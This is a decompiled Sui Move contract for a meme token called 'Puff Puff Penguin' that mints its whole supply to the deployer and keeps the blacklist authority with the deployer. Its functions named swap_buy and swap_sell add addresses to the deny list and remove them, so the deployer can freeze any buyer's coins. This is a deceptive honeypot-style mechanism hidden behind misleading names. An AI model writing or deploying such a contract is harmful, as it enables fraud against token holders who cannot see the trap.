module 0x120d91320bf3a0000ddbb81d083decc80f3882835eea62d68e9adcd8b1c73a3f::puffpuff {
    struct PUFFPUFF has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PUFFPUFF, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PUFFPUFF>(arg0, 9, b"PUFFPUFF", b"Puff Puff Penguin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmauzjmvcyu2Pzvyz8wQA9GqNt7ZQS8TDPQRCctkqmZBn4"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PUFFPUFF>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PUFFPUFF>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PUFFPUFF>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PUFFPUFF>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUFFPUFF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PUFFPUFF>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUFFPUFF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PUFFPUFF>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

